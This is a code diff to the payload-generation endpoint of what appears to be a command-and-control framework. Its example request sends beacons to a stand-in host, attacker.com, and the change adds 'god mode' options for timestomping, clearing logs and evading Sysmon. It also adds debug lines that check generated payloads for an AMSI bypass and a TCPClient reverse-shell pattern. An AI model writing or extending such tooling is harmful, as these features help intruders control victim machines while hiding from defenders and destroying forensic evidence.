@@ -229,7 +229,13 @@ def generate_payload():
         "c2_url": "http://attacker.com:8080/c2/beacon",
         "options": {
             "sleep": 30,
-            "jitter": 10
+            "jitter": 10,
+            "god_mode": {
+                "enabled": true,
+                "timestomp": true,
+                "clean_logs": true,
+                "sysmon_evade": true
+            }
         }
     }
     """
@@ -241,8 +247,22 @@ def generate_payload():
     c2_url = data.get("c2_url", request.url_root.rstrip('/') + "/c2/beacon")
     options = data.get("options", {})
     
+    # DEBUG: Log incoming request
+    import sys
+    print(f"🔍 BACKEND: Payload request received", file=sys.stderr)
+    print(f"   Type: {payload_type}", file=sys.stderr)
+    print(f"   Options: {options}", file=sys.stderr)
+    print(f"   God Mode: {options.get('god_mode', {})}", file=sys.stderr)
+    
     generator = get_payload_generator(c2_url)
     payload = generator.generate(payload_type, options)
+    
+    # DEBUG: Check what was generated
+    print(f"   Generated size: {len(payload)} bytes", file=sys.stderr)
+    if "Invoke-AMSIBypass" in payload:
+        print(f"   ✓ Elite PowerShell beacon detected", file=sys.stderr)
+    elif "New-Object System.Net.Sockets.TCPClient" in payload and len(payload) < 1000:
+        print(f"   ✗ WARNING: Old TCPClient payload detected!", file=sys.stderr)
     
     return jsonify({
         "success": True,
